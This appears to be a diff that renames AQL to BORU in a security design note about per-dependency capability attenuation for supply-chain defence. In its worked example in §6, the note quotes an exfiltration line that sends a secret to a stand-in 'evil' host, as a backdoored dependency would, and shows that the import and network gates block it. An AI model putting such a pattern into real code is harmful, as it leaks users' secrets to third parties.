@@ -4,18 +4,18 @@
 *host-imposed* permission model of [PERMISSIONS.10](PERMISSIONS.10.md)
 (implemented) into a *per-dependency, module-declared, transitively-attenuated*
 capability model. Where PERMISSIONS.10 answers "how does a host sandbox one
-AQL program?", this note answers "how does a program safely depend on code it
-did not write, and code *that* code did not write, all the way down?" — AQL's
+BORU program?", this note answers "how does a program safely depend on code it
+did not write, and code *that* code did not write, all the way down?" — BORU's
 response to the software-supply-chain trust crisis.
 
 It is written in direct conversation with Laurence Tratt's essay [*Can We
 Retain the Benefits of Transitive Dependencies Without Undermining
 Security?*](https://tratt.net/laurie/blog/2024/can_we_retain_the_benefits_of_transitive_dependencies_without_undermining_security.html)
-(2025-01-28). The short version of the argument below is that AQL, by virtue of
+(2025-01-28). The short version of the argument below is that BORU, by virtue of
 being a *concatenative interpreter with object-capability enforcement and no
 ambient authority*, is already most of the way to the system Tratt says our
 industry needs — but only for the portion of the dependency graph written *in
-AQL*, and only once four already-scaffolded mechanisms are finished and wired
+BORU*, and only once four already-scaffolded mechanisms are finished and wired
 together.
 
 ---
@@ -30,17 +30,17 @@ together.
   is our only real security boundary, and *within* a process there is
   effectively none.
 
-- **Why AQL is different.** AQL code is not machine code in a shared address
-  space. An AQL word cannot read arbitrary memory or make a syscall; the *only*
+- **Why BORU is different.** BORU code is not machine code in a shared address
+  space. A BORU word cannot read arbitrary memory or make a syscall; the *only*
   path to any effect is dispatching a word that reaches a **wrapped capability
   slot** on the registry (`lang/go/native/capabilities.go`). There is no
   ambient authority to strip away — it was never granted. Tratt's core premise
   ("every machine code instruction can read from, and write to, anywhere") is
-  *false for the AQL-written part of the graph*.
+  *false for the BORU-written part of the graph*.
 
 - **Why the cost objection evaporates.** Tratt notes that his "mutually
   distrusting cells that communicate cheaply" model founders on performance:
-  IPC is 5–7 orders of magnitude slower than an in-process call. AQL's
+  IPC is 5–7 orders of magnitude slower than an in-process call. BORU's
   cell boundary is **a hashtable lookup** (`policyGateWord`,
   `permissionedFileOps`), not a process boundary, and cells communicate by
   passing values on the stack. The expensive part of his design is free here,
@@ -49,7 +49,7 @@ together.
 
 - **The four questions this note answers.**
   1. *Do modules declare the capabilities they need?* → **Yes** — a proposed
-     `capabilities` block in the module's `aql.jsonic` manifest, read at load
+     `capabilities` block in the module's `boru.jsonic` manifest, read at load
      time, defaulting undeclared capabilities to **deny** (§4).
   2. *Can importers restrict deps even more?* → **Yes** — the effective grant
      to a dependency is `Compose(importer-effective, min(declared, per-dep
@@ -62,24 +62,24 @@ together.
      software lost (§6).
   4. *Well-known subsets / "a sorting library needs no capabilities"?* → **Yes**
      — a **`pure`** subset (`{}`), plus `deterministic`, `read-only`, `client`,
-     … Because all host access funnels through ~9 accessors and AQL has a static
+     … Because all host access funnels through ~9 accessors and BORU has a static
      checker, a module's *declared* footprint can be *statically verified*
      against its *actual* reachable footprint (§7; feasibility worked through in
      detail in §7.3–7.8, where the dynamic-dispatch surface reduces to a closed,
      gate-able list) — the reliable, re-runnable
      whitelisting Tratt calls "incredibly difficult to do."
 
-- **AQL-specific axis.** Resource bounds (step budget, wall-clock, **tape
+- **BORU-specific axis.** Resource bounds (step budget, wall-clock, **tape
   growth ceiling**, sub-engine depth, output bytes) are a *second, orthogonal*
   capability axis — quantitative, not allow/deny — that also attenuates
   transitively via the same min-fold. A pure sorting lib gets `{}` *and* a
   bounded tape/step budget: it can neither exfiltrate nor hang nor OOM the host
   (§8).
 
-- **The honest boundary.** All of the above holds for AQL-**source** modules.
-  A **native/Go** module (`aql:*`, host plugins) is arbitrary machine code and
+- **The honest boundary.** All of the above holds for BORU-**source** modules.
+  A **native/Go** module (`boru:*`, host plugins) is arbitrary machine code and
   is part of the trusted computing base; policy can gate whether it is
-  *imported* but cannot sandbox its Go once loaded (§9). AQL is "sealed at
+  *imported* but cannot sandbox its Go once loaded (§9). BORU is "sealed at
   compile time" — no runtime `.so` loading — which makes that native tier
   small, fixed, and auditable, concentrating supply-chain risk exactly where
   Tratt says trust should be scarce.
@@ -149,22 +149,22 @@ This note takes up his last sentence — the language rethink — for one langua
 
 ---
 
-## 2. Why AQL is structurally different (the thesis)
+## 2. Why BORU is structurally different (the thesis)
 
-AQL is a **concatenative, interpreted, object-capability** language. Three
+BORU is a **concatenative, interpreted, object-capability** language. Three
 properties, each of which directly negates one of Tratt's objections:
 
-### 2.1 No ambient authority → the memory-scan attack is impossible for AQL code
+### 2.1 No ambient authority → the memory-scan attack is impossible for BORU code
 
 A dependency in Rust/Python/JS is native (or compiled-to-native) code sharing
 one address space; nothing structurally prevents it from reading the bytes
-where your password sits. An AQL module is a sequence of **words** interpreted
-against a **tape** and a **registry**. AQL has no pointer arithmetic, no `unsafe`,
+where your password sits. A BORU module is a sequence of **words** interpreted
+against a **tape** and a **registry**. BORU has no pointer arithmetic, no `unsafe`,
 no FFI reachable from source, and — critically — **no way to name a host
 capability except by dispatching a word that the interpreter routes to a
 wrapped slot**. The capability substrate is explicit about this
 (`lang/go/native/capabilities.go` header): the capability implementations live
-on `Registry.Capabilities` under string keys and "aqleng itself never sees
+on `Registry.Capabilities` under string keys and "borueng itself never sees
 them"; every host touch goes through one of ~9 typed accessors
 (`HostFileOps` / `EffectiveFileOps`, `HostFormats`, `HostExtensions`,
 `HostSQLite`, `EffectiveClock`, `HostLogSinks`, `EffectiveDebugOps`,
@@ -174,13 +174,13 @@ ambient authority to confine; it was never granted.
 
 Tratt's premise "every instruction can read/write anywhere" is a statement
 about the von Neumann machine under a native language. It is simply not true of
-AQL source. That is the whole game.
+BORU source. That is the whole game.
 
 ### 2.2 The cell boundary is a hashtable lookup, not a process
 
 Tratt's model dies on cost: IPC is 5–7 orders of magnitude slower than an
 intra-process call, and "Unix-esque shared memory … is far too difficult to use
-reliably for untrusted components." AQL pays neither price. The "component
+reliably for untrusted components." BORU pays neither price. The "component
 boundary" is:
 
 - **for a kernel word:** `e.policyGateWord(name)` → `CheckWord(name)` — one
@@ -189,12 +189,12 @@ boundary" is:
   (`permissionedFileOps.WriteFile` → `policy.Check("fileops","write",{path,bytes})`
   → the inner op) — one policy evaluation per syscall-equivalent;
 - **for a whole restricted "cell":** a sub-engine with its own registry and an
-  attenuated policy (`aql:vm`), reached by `runInSubEngine` — a Go function
+  attenuated policy (`boru:vm`), reached by `runInSubEngine` — a Go function
   call, not a `fork`.
 
 Components communicate by leaving **values on the stack** and calling words —
 the same mechanism as any other call. There is no serialization, no RPC, no
-marshalling tax on the hot path. Tratt's expensive prerequisite is AQL's
+marshalling tax on the hot path. Tratt's expensive prerequisite is BORU's
 default execution model. His expressivity worry ("the horrors that RPC tends to
 descend to") likewise dissolves: a dependency's exports are ordinary words with
 ordinary signatures.
@@ -203,11 +203,11 @@ ordinary signatures.
 
 Tratt's deepest worry about capability *machines* is temporal: privileges
 change as a program moves through states, and "a single mistake … can
-accidentally gift a capability with unexpectedly high privileges." AQL's policy
+accidentally gift a capability with unexpectedly high privileges." BORU's policy
 is **data, resolved once, immutable for the lifetime of the engine**
 (PERMISSIONS.10 deliberately omits any runtime grant/revoke API — the same
 lesson Deno reached when it deprecated `Deno.permissions.request`). Capabilities
-are **not first-class values** an AQL program can hold, pass, or forge (unlike a
+are **not first-class values** a BORU program can hold, pass, or forge (unlike a
 CHERI capability pointer): the only "capability" a word can touch is the wrapped
 slot the host installed, and it cannot be widened from inside. There is no
 `doPrivileged`, no stack inspection, no ambient reference to leak. The confused-
@@ -215,19 +215,19 @@ deputy surface that sank Java's SecurityManager is absent by construction.
 
 ### 2.4 The mapping onto Tratt's aspiration
 
-| Tratt wants | AQL mechanism |
+| Tratt wants | BORU mechanism |
 |---|---|
 | Components isolated "as much as possible" | Isolated sub-registries per module / per sub-engine; lexical def-namespace isolation (`RunModuleBody`) + capability-slot isolation (this note) |
 | "Minimum permissions it needs" | Capability scopes + global hard-caps + `install:false` structural denial |
 | Cells that "communicate … cheaply" | Values on the stack; word dispatch; no IPC |
-| "Tightly specified" communication | Typed signatures on exports; the checker (`aql check`) |
-| Privilege separation (OpenSSH) | `aql:vm` sub-engines with attenuated policy |
+| "Tightly specified" communication | Typed signatures on exports; the checker (`boru check`) |
+| Privilege separation (OpenSSH) | `boru:vm` sub-engines with attenuated policy |
 | Least privilege enforced, not hoped | Object-capability wrapping; no ambient authority |
 
 **The catch, stated up front (expanded in §9):** every row above holds for
-AQL-*source* modules. The interpreter itself, and every *native* (`aql:*`,
+BORU-*source* modules. The interpreter itself, and every *native* (`boru:*`,
 Go-implemented) module, is arbitrary machine code to which Tratt's original
-argument applies in full. AQL does not abolish the trusted computing base; it
+argument applies in full. BORU does not abolish the trusted computing base; it
 makes it **small, fixed at build time, and legible**, and confines everything
 above it.
 
@@ -261,7 +261,7 @@ from the code in three material ways.
   pattern).
 - **Built-in profiles** (7, not 6): `full, trusted, sandbox, compute, gen,
   read-only, client` (`builtin.go`). `compute` — not "no I/O at all" as the doc
-  says, but pure math + clock + `mutate` + in-memory formats + `aql:math`, with
+  says, but pure math + clock + `mutate` + in-memory formats + `boru:math`, with
   `fileops/network/sqlite/process/env` all `install:false`. There is **no
   `pure` profile**; `compute` is the pure tier. `gen` (used by property-based
   testing) is absent from the doc entirely.
@@ -276,7 +276,7 @@ from the code in three material ways.
 | Network fetch | `fetch.go::checkFetchPolicy` → `Check("network","connect",{url,host,port})` | **live** |
 | Log emit / sink install | `log_module.go::logAllowed` → `Check("log",…)` | **live** |
 | `install:false` structural denial | `SetHostFileOps`/`Formats`/`SQLite`/`LogSinks` delete the slot; accessor returns a not-installed stub | **live** |
-| Module *export* call | policy evaluator `checkModuleCall` (`Check("modules","call",{module,export})`) | **STUB — fully implemented + tested, but zero production callers.** Per-export deny rules (e.g. `aql:time deny sleep`) are dead. |
+| Module *export* call | policy evaluator `checkModuleCall` (`Check("modules","call",{module,export})`) | **STUB — fully implemented + tested, but zero production callers.** Per-export deny rules (e.g. `boru:time deny sleep`) are dead. |
 | SQLite / env / process / clock per-op | `GlobalsFor` binds them, but no production `Check("sqlite"/"env"/"process"/"clock",…)` | **inert** (only `Installed(sqlite)` on/off is enforced) |
 | `mutate` / `system-info` hard-caps | in the enum; no `GlobalsFor` binding; no production `CheckGlobal` callers | **inert** |
 
@@ -292,23 +292,23 @@ The real, sound primitive is **`Compose(parent, child) Policy`**
 (`compose.go`): it returns an AND-of-both wrapper where `Check` / `CheckGlobal`
 / `CheckWord` require **both** layers to allow (parent votes first,
 short-circuits), `Installed()` is `parent ∧ child`, and `Limits()` is the
-**min-non-zero of each field**. `aql:vm`'s `runInSubEngine` composes
+**min-non-zero of each field**. `boru:vm`'s `runInSubEngine` composes
 `Compose(parentPol, childPol)` for exactly this reason: a child rule can never
 lift a parent deny, *regardless of the child's rule shape*. This is the primitive
 the rest of this note builds on.
 
 ### 3.4 Isolation and marshalling (two more corrections)
 
-- **Imported AQL modules do NOT start blank.** `RunModuleBody`
+- **Imported BORU modules do NOT start blank.** `RunModuleBody`
   (`native_module_module.go`) runs a file module in a fresh sub-registry but
   **inherits the parent's host capabilities into it**:
   `SetHostFileOps(modReg, HostFileOps(parent))` (already the policy-wrapped
   `permissionedFileOps`), plus formats, extensions, streams, and
-  `Modules.InheritConfig` (so the child can itself `import "aql:…"`). Isolation
+  `Modules.InheritConfig` (so the child can itself `import "boru:…"`). Isolation
   today is **lexical** (the def namespace; only `export`ed names cross), **not
   capability**. Worse, `CapPolicy` is *not* propagated, so any capability that
   re-checks at call time via `HostPolicy(childReg)` sees `nil` = allow-all
-  inside the child. **Per-dependency capability attenuation for AQL modules is
+  inside the child. **Per-dependency capability attenuation for BORU modules is
   therefore genuinely unbuilt** — capabilities flow *down* the import graph
   unattenuated. This is the central gap §5–§6 close.
 - **The import boundary is by-reference, not by-copy.** Exports cross as shared
@@ -326,19 +326,19 @@ mechanically-checkable property. Grepping both the module builder and the
 underlying native implementation, these modules touch **no** accessor and import
 no `os`/`net`/`time`/`math-rand`:
 
-> `aql:math-util`, `aql:array-util` (**including `sort`**), `aql:string-util`,
-> `aql:type-util`, `aql:struct-util`, `aql:logic-util`, `aql:bin-util`,
-> `aql:matrix-util`, and `aql:report`.
+> `boru:math-util`, `boru:array-util` (**including `sort`**), `boru:string-util`,
+> `boru:type-util`, `boru:struct-util`, `boru:logic-util`, `boru:bin-util`,
+> `boru:matrix-util`, and `boru:report`.
 
 These are exactly the `-util` convention modules plus `report`. This is the
 concrete evidence behind "a pure sorting library needs no capabilities" (§7):
-`aql:array-util`'s `sort` is *already* capability-free and could be *proven* so.
+`boru:array-util`'s `sort` is *already* capability-free and could be *proven* so.
 
-The capability-bearing modules are the complement: `aql:io` (fileops + formats +
-sqlite + output), `aql:net` (network), `aql:time-util` (clock + real timers),
-`aql:rand` (one clock read at import for the default seed), `aql:query` (sqlite),
-`aql:log`, `aql:debug`, `aql:model` (fileops), `aql:parselang` (formats),
-`aql:vm`, `aql:test` (clock).
+The capability-bearing modules are the complement: `boru:io` (fileops + formats +
+sqlite + output), `boru:net` (network), `boru:time-util` (clock + real timers),
+`boru:rand` (one clock read at import for the default seed), `boru:query` (sqlite),
+`boru:log`, `boru:debug`, `boru:model` (fileops), `boru:parselang` (formats),
+`boru:vm`, `boru:test` (clock).
 
 ### 3.6 Resource governors (enforced) vs. `Limits` (declared-only)
 
@@ -391,7 +391,7 @@ without bound latches `exhausted` rather than OOMing the host.
 `MaxStepBudget`, `MaxStackDepth`, `MaxMemoryBytes`, `MaxOutputBytes`, and
 `MaxSubEngineDepth` (default 8). They are **resolved, composed (min-fold), and
 displayed — but no engine, registry, or module code reads any of them to bound
-execution.** Even `MaxSubEngineDepth` is never checked, so `aql:vm` nesting is
+execution.** Even `MaxSubEngineDepth` is never checked, so `boru:vm` nesting is
 unbounded today. The *algebra* for treating limits as attenuating quantitative
 capabilities (`Compose(...).Limits()` min-fold) is built and tested; the
 *consumer* is missing. §8 closes this.
@@ -405,9 +405,9 @@ undeclared capabilities to deny.**
 
 ### 4.1 Where it attaches
 
-A published AQL module is a `.aql` payload plus an **`aql.jsonic`** manifest
+A published BORU module is a `.boru` payload plus an **`boru.jsonic`** manifest
 (fields today: `name`, `major`/`minor`/`patch`, `files`, `deps`, per-module
-`main` + `resource`), resolved by `aql prep` into **`.aql/aql.json`**, which is
+`main` + `resource`), resolved by `boru prep` into **`.boru/boru.json`**, which is
 already read *at module-load time* by `resolveModuleMain` and
 `loadModuleResources`. That resolved manifest is the natural home for a
 capability declaration — it is on the load path already, and the registry's
@@ -419,7 +419,7 @@ The declaration draws from the existing `KnownScopes` / `GlobalOps` vocabulary
 so a module's *ask* and a host's *grant* speak one language:
 
 ```jsonic
-// aql.jsonic for a CSV-loading module
+// boru.jsonic for a CSV-loading module
 name: "acme-csv"
 major: 1  minor: 2  patch: 0
 capabilities: {
@@ -432,7 +432,7 @@ capabilities: {
 ```
 
 ```jsonic
-// aql.jsonic for a sorting library
+// boru.jsonic for a sorting library
 name: "acme-sort"
 capabilities: { requires: {} }               // pure — the empty ask
 // equivalently: capabilities: { subset: "pure" }   (see §7)
@@ -458,17 +458,17 @@ Design decisions:
 
 Tratt's strongest practical objection to whitelisting is authorship:
 "incredibly difficult to do reliably, and what happens when a new version …
-do I have to examine it again from scratch?" AQL has an answer the native
-ecosystems don't: **`aql check` can *infer* the manifest** and offer to write
+do I have to examine it again from scratch?" BORU has an answer the native
+ecosystems don't: **`boru check` can *infer* the manifest** and offer to write
 it. Because the capability scopes are an *effect alphabet* and the carrier
 checker already walks the call graph
-([effect-oriented-programming-in-aql-report.0](effect-oriented-programming-in-aql-report.0.md)
+([effect-oriented-programming-in-boru-report.0](effect-oriented-programming-in-boru-report.0.md)
 idea #1), a module's required-capability set is the union of the effect sets of
 the words it can reach — a fixpoint the checker already computes for types. So:
 
 1. author writes the module;
-2. `aql check --emit-capabilities` infers `{fileops:{read}, formats:{decode:[…]}}`
-   and writes it into `aql.jsonic`;
+2. `boru check --emit-capabilities` infers `{fileops:{read}, formats:{decode:[…]}}`
+   and writes it into `boru.jsonic`;
 3. the author confirms (or tightens) it;
 4. on every new version, step 2 re-runs automatically — the manifest either
    still holds, or the *diff* shows a widened ask (a `network` that wasn't there
@@ -491,7 +491,7 @@ down.** The importer is always the senior party.
 For an import edge *parent → dep*:
 
 ```
-declared   = dep.aql.jsonic.capabilities.requires        // the ask (§4)
+declared   = dep.boru.jsonic.capabilities.requires        // the ask (§4)
 override   = parent's per-dep grant for this edge          // optional, ≤ declared
 offered    = min(declared, override)                       // importer may hand LESS
 effective  = Compose(parent_effective_policy, offered)     // AND-of-both (§3.3)
@@ -523,7 +523,7 @@ policy. Concretely, fixing the §3.4 gap:
 
 A surface sketch (final syntax open, §12):
 
-```aql
+```boru
 import "acme-csv"                                   // grant = declared ∩ parent
 import "acme-csv" with { fileops: { read: {
           where: { path: ["./data/**"] } } } }      // grant strictly less
@@ -531,12 +531,12 @@ import "acme-sort" as-pure                           // grant = {}  (override to
 ```
 
 or, declaratively, a per-dependency grant block in the importer's own
-`aql.jsonic` alongside `deps`, so the whole tree's edge-grants are one
+`boru.jsonic` alongside `deps`, so the whole tree's edge-grants are one
 reviewable artifact (the natural companion to a lockfile, §9.3).
 
-### 5.3 Relationship to `aql:vm`
+### 5.3 Relationship to `boru:vm`
 
-`aql:vm`'s `Vm.run-with code policy` already runs code under
+`boru:vm`'s `Vm.run-with code policy` already runs code under
 `Compose(parent, child)` in an isolated sub-engine. Per-edge import attenuation
 is, in effect, **`vm.run-with` applied at each `import`** with the edge's
 `effective` policy and the module body as the code — the same primitive, moved
@@ -563,7 +563,7 @@ program that the developer actually controls. **Trust decays along the chain
 instead of extending unchanged** — precisely the property Tratt says software
 lost and physical-world trust retains.
 
-Worked example (Tratt's own image-decoder scenario, in AQL terms):
+Worked example (Tratt's own image-decoder scenario, in BORU terms):
 
 ```
 root program            grant: { fileops:{read,write}, network:{connect: allowlist} }
@@ -578,13 +578,13 @@ incapable of touching the network** even if a future release is backdoored: it
 was handed `{}`, it runs in a child registry whose network slot is uninstalled,
 and there is no ambient authority to fall back on. A compromised `acme-sort`
 that inserts `Net.fetch "https://evil/?p=" concat (read-secret)` fails at
-`import "aql:net"` (the `modules` import gate denies it) — and even if it were
+`import "boru:net"` (the `modules` import gate denies it) — and even if it were
 already imported, at `checkFetchPolicy` (network `install:false`). The
 memory-scan attack from §1 has no analogue at all: there is no memory to scan.
 
 ### 6.1 What must ship to make this real
 
-Transitivity is *sound in the algebra today* (Compose composes at each `aql:vm`
+Transitivity is *sound in the algebra today* (Compose composes at each `boru:vm`
 layer) but *not yet enforced at import edges*. Three concrete items, all
 scaffolded:
 
@@ -596,7 +596,7 @@ scaffolded:
    denies (e.g. `deny sleep`) actually bite. *(fixes the §3.2 stub)*
 3. **Bound the depth**: enforce `MaxSubEngineDepth` with a counter in
    `runInSubEngine` / the import path, so a maliciously deep transitive chain
-   (or `aql:vm` recursion) cannot exhaust the Go stack. *(fixes the §3.6
+   (or `boru:vm` recursion) cannot exhaust the Go stack. *(fixes the §3.6
    inert-limit gap)*
 
 ---
@@ -615,7 +615,7 @@ dependency can request and an importer can grant wholesale:
 
 | Subset | Capabilities | Example modules |
 |---|---|---|
-| **`pure`** | `{}` — nothing | `aql:array-util` (`sort`), `aql:math-util`, `aql:string-util`, all `-util`, `aql:report` |
+| **`pure`** | `{}` — nothing | `boru:array-util` (`sort`), `boru:math-util`, `boru:string-util`, all `-util`, `boru:report` |
 | **`deterministic`** | pure + no clock + no rand seed → reproducible | pure algorithms that must not observe wall-time |
 | **`read-only`** | `fileops.read` + `formats.decode` | config loaders, parsers over local files |
 | **`compute`** | pure + in-memory formats + `mutate` + clock | number-crunching with scratch state |
@@ -628,21 +628,21 @@ capability-least-privilege default Tratt asks for, expressed once.
 
 ### 7.2 "A sorting library needs basically no capabilities" — and can be *proven* so
 
-This is where AQL answers Tratt's whitelisting objection head-on. It is not
+This is where BORU answers Tratt's whitelisting objection head-on. It is not
 enough for `acme-sort` to *declare* `pure`; a backdoored release could declare
 `pure` and still reach `Net.fetch`. What makes the declaration *load-bearing* is
-that AQL can **statically verify declared ⊇ actual**:
+that BORU can **statically verify declared ⊇ actual**:
 
-- **The mechanism.** All host access funnels through ~9 accessors (§3.5), AQL
+- **The mechanism.** All host access funnels through ~9 accessors (§3.5), BORU
   has no ambient authority, and the carrier checker already computes a call-graph
   fixpoint. Adding an `Effects []string` facet to signatures (drawn from the
   capability vocabulary) and unioning it up the graph — the
-  [effect-oriented-programming report](effect-oriented-programming-in-aql-report.0.md)'s
+  [effect-oriented-programming report](effect-oriented-programming-in-boru-report.0.md)'s
   highest-leverage idea, currently the one "Absent" row in its parallel-evolution
   table — yields each module's *actual* reachable capability set. The compiler
   already tracks a pure/effectful split informally (`CompileIslandPure`); this
   promotes it to a first-class, inferred, checkable property.
-- **The check.** `aql check` verifies the manifest's *declared* set is a
+- **The check.** `boru check` verifies the manifest's *declared* set is a
   superset of the *inferred actual* set. A module that declares `pure` but
   reaches a `network` word is a **compile-time capability violation**, reported
   at the call site, *before any runtime denial*. Publish-time gating rejects it.
@@ -657,7 +657,7 @@ that AQL can **statically verify declared ⊇ actual**:
   from calling `HostFileOps`. Machine-check it.
 
 Verification is the difference between a manifest that is a *promise* (Tratt's
-distrusted case) and a manifest that is a *proof for the AQL-source portion of
+distrusted case) and a manifest that is a *proof for the BORU-source portion of
 the graph*. Native modules can only be *attested*, not verified (§9) — which is
 why the trust boundary matters.
 
@@ -676,8 +676,8 @@ different difficulty:
   `where`-constraints?" **Feasible, with a soundness/precision trade-off**: some
   modules over-approximate unless annotated.
 
-**Why AQL is unusually favorable.** Doing this in Rust/JS is hard because the
-escape hatch is *every pointer and every dynamic call*. In AQL the surface is
+**Why BORU is unusually favorable.** Doing this in Rust/JS is hard because the
+escape hatch is *every pointer and every dynamic call*. In BORU the surface is
 small, named, and finite, and the analyzer substrate already exists:
 
 - **Closed effect alphabet + no ambient authority.** Effects enter *only*
@@ -735,9 +735,9 @@ for the `do` case in full.
 **Transitivity** is enumerable iff imports resolve statically — literal import
 string ⇒ walk it; computed import ⇒ over-approximate or forbid; data-file
 imports (`.json`/`.csv`) contribute no code and are trivially pure. **Native
-modules are inference leaves:** their Go cannot be inferred from AQL, so each
+modules are inference leaves:** their Go cannot be inferred from BORU, so each
 carries a *trusted, attested capability summary* (once — the native set is
-small, fixed, and compile-time-sealed, §9.1). The AQL-source interior is
+small, fixed, and compile-time-sealed, §9.1). The BORU-source interior is
 inferred; the native leaves are labelled; the fixpoint closes. This
 presupposes a *pinned* dependency graph, which today's registry does not yet
 provide (§9.3).
@@ -749,7 +749,7 @@ executed paths). The productive pattern is: dynamic trace to *propose* a
 manifest, static analysis to *prove it is an over-approximation*.
 
 **Verdict.** The purity/reachability verdict is highly feasible, sound, and
-buildable on shipped machinery — a real guarantee for the AQL-source graph.
+buildable on shipped machinery — a real guarantee for the BORU-source graph.
 Precise effect sets are best-effort: dynamic-eval-heavy code either annotates
 or over-approximates to its grant, which the design tolerates because the
 importer gates the actual grant regardless. The design should therefore lead
@@ -759,7 +759,7 @@ require.
 
 ### 7.4 Worked case: when is `do [body]` analysable?
 
-`do` is the clearest lens on §7.3 because it is AQL's general "run this code"
+`do` is the clearest lens on §7.3 because it is BORU's general "run this code"
 word, and the intuition "`do [add 1 1]` is obviously fine" is exactly right —
 the question is *where the line falls*. `do`'s code-body signature is
 `{Args:[TList], NoEvalArgs:{0:true}, ReturnsFn: doListReturnsFn,
@@ -780,7 +780,7 @@ The knowability lattice, most-to-least analysable:
 | Literal with its own locals/params | `do [def y 5  y add 1]` | **Yes** — self-contained; walked as a carrier body |
 | Name bound once to a literal | `def b [add 1 1]  do b` | **Usually** — needs def-substitution: feasible when the checker tracks `b`'s concrete value and `b` is not reassigned / shadowed / a parameter; degrades to "List of unknown code" otherwise |
 | Computed list | `do (concat [add] [1 1])` | **Only if constant-foldable** — a pure fold to a known list is analysable; a general computation is not |
-| Received / opaque value | `do (args.0)`, `do (read "x.aql" …)` | **No** — only the *type* (`List`) is known, not the *code*; over-approximate to the module's grant |
+| Received / opaque value | `do (args.0)`, `do (read "x.boru" …)` | **No** — only the *type* (`List`) is known, not the *code*; over-approximate to the module's grant |
 
 `do [add 1 1]` is trivial precisely because the body is `[Word(add), 1, 1]` —
 an inert const whose single word is a pure core arithmetic op — so
@@ -902,8 +902,8 @@ Precision by variant:
 Two further points close it:
 
 - **Analyzability-as-capability, in its sharpest form.** `Vm.run` requires the
-  module to have imported `aql:vm`, which the `modules` import scope gates. A
-  `pure`/`deterministic` profile that denies `aql:vm` makes the entire hatch
+  module to have imported `boru:vm`, which the `modules` import scope gates. A
+  `pure`/`deterministic` profile that denies `boru:vm` makes the entire hatch
   *unreachable* — there is nothing to analyse because the module cannot call it.
 - **A dangerous *string* is itself gated.** An interesting string (one that
   drives I/O) generally has to be obtained via `read`/`fetch` — separate,
@@ -932,7 +932,7 @@ edge.
 
 ### 7.7 The milder hatches
 
-The three worked cases above are AQL's general dispatch primitives; the
+The three worked cases above are BORU's general dispatch primitives; the
 remaining ways source can run code the analyzer cannot see are milder — each
 either reduces to a case above or is narrower.
 
@@ -950,7 +950,7 @@ are analysable by construction even more reliably than `do`. No new surface;
 just the union of the two prior cases, precise in the common case.
 
 **(b) Computed `import`** — the transitivity-specific hatch. `import` evaluates
-its argument (`AsConcreteString` / `AsConcreteAtom`), so `import "aql:math"`
+its argument (`AsConcreteString` / `AsConcreteAtom`), so `import "boru:math"`
 (literal — the universal idiom) is a statically resolvable *edge*, while
 `import <computed>` defeats static enumeration of the transitive graph. Two
 mitigations: (i) it is still gated at runtime by the `modules` import scope, so
@@ -961,7 +961,7 @@ source literal?) that removes the hatch for any module wanting a verified
 transitive manifest. This is the transitivity analogue of
 "analyzability is a capability."
 
-**(c) Macros** — analysed post-expansion, so no runtime blind spot. AQL macros
+**(c) Macros** — analysed post-expansion, so no runtime blind spot. BORU macros
 are a *quote-template* surface (`defmacro` = `fn` + auto-`NoEvalArgs` +
 expand-time splice; the template is a `quote […]` region with `unquote` /
 `splice`), expanded by a deterministic, hygiene-renaming walker whose output
@@ -970,7 +970,7 @@ runs at parse/compile time *before* the effect walk, **the checker analyses the
 expanded code** — a macro expanding to `IO.read` contributes `{fileops.read}`
 to the site. The one wrinkle is *expand-time* effects: an `unquote
 (effectful-expr)` runs during expansion — a compile-time surface distinct from
-runtime, and the AQL analogue of the build-script attacks Tratt cites (the
+runtime, and the BORU analogue of the build-script attacks Tratt cites (the
 "install every Python library" experiment). It is rare, discouraged, gated the
 same way if expansion runs under a policy, and a strict profile can additionally
 require macro unquotes to be pure. Macros do not defeat *runtime* capability
@@ -983,7 +983,7 @@ export selected by computed key (`IO get name`). Both are bounded: you can only
 `get` exports of a module you have already (gated) imported, and applying the
 result is the §7.5 case under the applier's grant. No new surface.
 
-**Why the taxonomy being *closed* is the whole point.** Every way AQL source can
+**Why the taxonomy being *closed* is the whole point.** Every way BORU source can
 dispatch code the analyzer cannot statically see reduces to a **finite, named,
 individually gate-able list**: `do`-body, `apply`-value, `Vm.run`-string,
 computed-`import`, macro-expand, computed-`get`. Each has a conservative
@@ -991,19 +991,19 @@ handling (§7.3) and each is reachable only through a capability a strict profil
 can withhold. This closedness is precisely what makes *sound over-approximation
 achievable* — and it is the structural difference from a native language, where
 Tratt's escape hatch is *every pointer and every instruction*, an open set no
-analysis can enumerate. In AQL the dynamic surface is small enough to list on
+analysis can enumerate. In BORU the dynamic surface is small enough to list on
 one line, which is why "prove this module reaches no capability" is a decidable
 question rather than a hopeful one.
 
 ### 7.8 Operationalizing it: the `analyzable` constraint
 
-§7.3–7.7 establish that AQL's dynamic surface is a closed, gate-able list. This
+§7.3–7.7 establish that BORU's dynamic surface is a closed, gate-able list. This
 subsection turns that into a concrete constraint an importer can *require* of a
 dependency — **`analyzable`**: a static / publish-time mode under which a
 module's capability footprint is *provably* inferable because every escape hatch
 is either resolved or forbidden. A module built under `analyzable`:
 
-- **may not import `aql:vm`** (removes `Vm.run` / `run-with`, §7.6), enforced by
+- **may not import `boru:vm`** (removes `Vm.run` / `run-with`, §7.6), enforced by
   the `modules` import allowlist;
 - **must use literal `import` arguments** (removes computed import, §7.7b) — a
   syntactic checker rule;
@@ -1022,7 +1022,7 @@ Three clarities keep it honest:
 
 - **`analyzable` is orthogonal to the capability subsets** (§7.1). It is not a
   runtime scope like `fileops`; it constrains the *shape of the code* so the
-  effect set is inferable, and is enforced at `aql check` / publish, not at the
+  effect set is inferable, and is enforced at `boru check` / publish, not at the
   `Check()` gate. The subsets say *what* a module may do; `analyzable` says
   *that we can prove what it does*. A module can be `analyzable` yet non-`pure`
   (it verifiably uses `{fileops.read}`).
@@ -1036,12 +1036,12 @@ Three clarities keep it honest:
 
 ---
 
-## 8. AQL-specific resource limits — the quantitative capability axis
+## 8. BORU-specific resource limits — the quantitative capability axis
 
 Tratt's model is about *what* a dependency may do. It is silent on *how much* —
 yet a purely-computational dependency with zero capabilities can still wedge or
 exhaust the host (a `sort` that never terminates, a transform that splices the
-tape without bound). AQL already has the governors to prevent this; this note
+tape without bound). BORU already has the governors to prevent this; this note
 makes them **per-dependency and transitively attenuating**, a second capability
 axis orthogonal to allow/deny.
 
@@ -1089,9 +1089,9 @@ the host keeps its 64 MB.
 Denying `clock` and the `rand` seed makes a dependency's execution
 **reproducible** — valuable for supply-chain auditing (same input ⇒ same
 behaviour ⇒ diffable) and as the precondition for the
-[EOP report](effect-oriented-programming-in-aql-report.0.md)'s `with-handler`
+[EOP report](effect-oriented-programming-in-boru-report.0.md)'s `with-handler`
